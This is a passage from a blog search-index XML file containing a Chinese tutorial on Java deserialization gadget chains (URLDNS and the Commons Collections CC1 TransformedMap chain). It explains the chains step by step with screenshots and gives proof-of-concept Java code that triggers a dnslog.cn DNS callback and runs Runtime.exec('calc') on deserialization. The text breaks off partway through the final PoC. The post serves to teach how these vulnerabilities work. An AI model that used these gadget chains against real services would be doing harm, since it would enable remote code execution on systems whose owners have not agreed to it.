<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java反序列化-CC链</title>
      <link href="/2025/03/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC%E9%93%BE/"/>
      <url>/2025/03/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反序列化的漏洞产生</p><p>当开发人员编写的代码接受来自用户特意编造的序列化数据并尝试将其反序列化以在程序中使用时，就会出现漏洞。</p><p>Java是允许我们重写writeObject()和readObject()的。</p><p>漏洞产生可能的形式：</p><ul><li>入口类的readObject()直接调用危险方法</li><li>入口类包含可控类，该类有危险方法，readObject()时调用</li><li>入口类包含可控类，该类又调用其他有危险方法的类，readObject()时调用</li></ul><p>攻击条件：</p><ul><li>继承Serializable接口</li><li>入口类 source (重写readObject() 调用常见的函数 参数类型宽泛 最好jdk自带)</li><li>调用链 gadgetchain 相同名称 相同类型</li><li>执行类 sink (rce ssrf 写文件等)</li></ul><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>java反序列化第一步，学习URLDNS这条链子。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>不限制jdk版本，使用Java内置类，对第三方依赖没有要求。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain：</span><br><span class="line">1. HashMap.readObject()</span><br><span class="line">2. HashMap.putVal()</span><br><span class="line">3. HashMap.hash()</span><br><span class="line">4. URL.hashCode()</span><br></pre></td></tr></table></figure><p>这条链子常用于验证是否存在java反序列化漏洞。</p><p>发现者可能在寻找SSRF的过程中发现的这条链子，所以最开始我们需要查看URL包的源码。首先它是implements java.io.Serializable的，可以进行反序列化。</p><p>向下寻找在一个hashCode中有一个handler.hashCode。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210912833.png" alt="img"></p><p>我们跟进handler.hashCode可以到URLStreamHandler.java中。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913656.png" alt="img"></p><p>这里有一个getHostAddress()，传入了URL u，继续跟进看看这个函数的实现。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913819.png" alt="img"></p><p>这里有个InetAddress.getByName，会通过DNS解析该host，以获取对应的ip地址，这个过程会涉及到网络访问。</p><p>接下来就是需要找到调用hashCode的类了，这个比较常见所以有很多。我们可以采用链子里面常用的HashMap，存在hashCode的同名函数替换，HashMap重写了readObject正好作为入口类。</p><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么HashMap要自己实现writeObject和readObject方法？ </a></p><p>在HashMap的readObject里面可以看到使用了putVal</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913369.png" alt="img"></p><p>跟进hash。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913385.png" alt="img"></p><p>这里调用了hashCode，也就是我们赋值的时候会触发，我们接着就可以开始构造链子了。</p><p>按照前面的逻辑可以写出以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4ssvce.dnslog.cn&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是会发现在put的时候我们就已经触发dns解析了，因为put里面也使用了hash这个函数，解决这个问题这就需要再次回到URL中的hashCode。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913186.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210913371.png" alt="img"></p><p>这里对值做了判断，保证键的唯一性。我们最终的目标是想要反序列化的时候去触发handler.hashCode，达到确认反序列化漏洞的存在，但是在反序列化之前就触发了，也就是只要put就会触发。我们可以利用反射通过修改类中的成员变量完成这一操作。</p><p>也就是我们需要在put之前hashCode的值不为-1，这样就不会去触发handler.hashCode，在put完之后又要保证hashCode为-1，为后面反序列化触发handler.hashCode做准备。</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>所以有以下最终的Poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4ssvce.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url,<span class="number">1</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC1链"><a href="#CC1链" class="headerlink" title="CC1链"></a>CC1链</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a><strong>环境</strong></h3><p>jdk8u65</p><p>cc3.2.1</p><h3 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h3><p>cc1有两条链子，先来分析TransformedMap这条。</p><p>我们从Transformer入手，看到Transformer.java可以发现它是一个接口。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210921720.png" alt="img"></p><p>我们ctrl+h可以查看它的实现类。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210921777.png" alt="img"></p><p>我们逐个跟进去看，会发现有意思的几个类。</p><p>首先是ConstantTransformer，它在构造器中初始化了一个常量。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210921474.png" alt="img"></p><p>并且它的transform方法是返回这个常量，也就是不管transform方法传入什么值都只会和我们初始化ConstantTransformer的时候传入的值有关，这个点在链子的中途会用到。</p><p>再是ChainedTransformer，顾名思义它肯定跟链有关系。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922233.png" alt="img"></p><p>它会接受一个Transformer数组，然后传给一个变量，在transform中会将这个数组进行链式调用，前一个的输出作为后一个的输入，这个类在后面我们也能够用到。</p><p>最后一个就是InvokerTransformer，也是我们漏洞的主要利用点，我们在反射里面学过拿到方法之后的调用就是invoke，这里也是类似的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922518.png" alt="img"></p><p>在它的transform方法中尝试利用反射的一系列操作去执行类的方法，而且这里是我们能够控制的，也就是说可以执行恶意方法。</p><p>我们先来看看在java中的命令执行是什么样子的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简单的静态调用</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射调用</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Class</span> <span class="variable">exec</span> <span class="operator">=</span> r.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> exec.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后我们根据InvokerTransformer的构造器和transform方法能够根据反射调用命令执行写出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">execTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">execTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p>所以现在主要是寻找同名方法替换了，我们需要利用transform，来看看哪些类实现了这个方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922266.png" alt="img"></p><p>还是有很多的，我们主要看向Map的地方，Map用的比较常见可能链子更容易构造出来，或者去找一个类用到的次数比较多的，cc1有两条可走，第一条是LazyMap，还可以走TransformedMap，我们先来看看TransformedMap。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922049.png" alt="img"></p><p>这里有好几种，链子里面用到的是checkSetValue。 可以看到构造器和方法都是protected权限的，也就是说只能本类内部访问，不能外部调用去实例化，那么我们就需要找到内部实例化的工具，这里往上查找，可以找到一个public的静态方法decorate。<img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922957.png" alt="img"></p><p>这里new了一个TransformedMap。我们来寻找checkSetValue的用法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922083.png" alt="img"></p><p>发现只有一个AbstractInputCheckedMapDecorator的类用到了它。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922945.png" alt="img"></p><p>这个MapEntry重写了setValue，而我们一般Map的遍历会用到这个，并且在它的子类TransformedMap没有去重写它，也就是当我们对TransformedMap进行遍历时，使用setValue它本身没有这个方法，会去找它的父类AbstractInputCheckedMapDecorator的setValue方法，从而又回到了checkSetValue。我们可以编写一个简单的链子了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">execTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,execTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们就需要找setValue的用法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922378.png" alt="img"></p><p>有很多，并且是能够找到一个我们最终需要的入口类，也就是存在一个类的readObject里面调用了setValue这个方法。</p><p>AnnotationInvocationHandler这个类。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210922876.png" alt="img"></p><p>首先它并不是一个public的类，没有给出修饰词，属于default。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210923346.png" alt="img"></p><p>这里我们可以用全包名，通过反射去获取。我们最后是需要触发setValue，我们来看看具体怎么触发。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210923270.png" alt="img"></p><p>对一个Map进行了遍历，检查每个值是否符合预期的类型，如果不符合，则将替换为一个异常代理对象。而我们的目的就是为了达到不符合去触发下面的setValue。</p><p>首先这个Map是我们能够控制的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210923637.png" alt="img"></p><p>在它的构造器里面初始化了memberValues。我们将大概的流程写入链子中去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">execTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,execTransformer);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们根据构造器传入了对应的值，然后进行了实例化和反序列化操作。但是我们还要解决几个问题，第一个就是Runtime没有实现Serializable，但是它的原型类class是有的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们可以利用反射实现。接着尝试用之前的InvokerTransformer去调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntime= (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">Runtime r=(Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>可以发现有点麻烦，我们在之前还分析过一个链式调用的类，ChainedTransformer。ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法，所以我们根据语法可以直接写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>还有需要达到readObject里面SetValue的地方，我们前面分析过了是判断Map是否符合预期。它的流程大概就是，在我们初始化的时候传入了一个注解类型和一个Map变量，然后Map会存储了注解成员的名称，然后将这个名称传给了memberType，第一个if就是判断这个成员是否存在，第二个if检查value是否是memberType类型或其子类型的实例。第二个我们很好达到，因为让他不一样很简单，而且我们已经确定了是要传入我们的transformedmap，主要来看看第一个。</p><p>这里我们可以用Target.class（只要满足的应该都行，Retention好像也可以），它里面有一个成员变量是value，所以在transformmap的键我们传入value字符串即可，可以发现成功走到了setValue。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210923011.png" alt="img"></p><p>还有最后一个问题，我们这里并没有去触发链子，这里它把setValue的参数给固定了。这时候就需要用到我们之前分析过的类了，ConstantTransformer类，它只与我们初始化的时候有关，我们在调用链里面补上就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>到这里，我们整个调用链就清楚了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain：</span><br><span class="line">1. AnnotationInvocationHandler.readObject()</span><br><span class="line">2. TransformedMap.setValue()（父类的方法）</span><br><span class="line">3. TransformedMap.checkSetValue()</span><br><span class="line">4. InvokerTransformer.transform()</span><br><span class="line">5. Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h4><p>最后的完整代码是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">rc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] Transformers=<span class="keyword">new</span> <span class="title 